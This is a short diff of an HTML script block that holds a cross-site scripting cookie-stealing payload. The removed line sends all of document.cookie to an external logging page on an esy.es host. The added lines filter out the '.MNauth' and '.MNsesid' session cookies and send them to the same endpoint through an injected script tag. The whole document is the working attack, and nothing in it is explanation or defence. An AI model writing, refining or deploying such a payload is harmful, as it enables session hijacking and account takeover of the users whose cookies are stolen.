@@ -1,3 +1,8 @@
 <script>
-document.write('<img src="http://****.esy.es/log.php?cookie=' + document.cookie + '" />')
+var tok = document.cookie.split(";")
+var cookie = "";
+for (var i = 0; i < tok.length; i++)
+  if (tok[i].includes(".MNauth") || tok[i].includes(".MNsesid"))
+    cookie += tok[i] + ";";
+document.write('<script src="http://****.esy.es/log.php?cookie=' + cookie + '" />')
 </script>
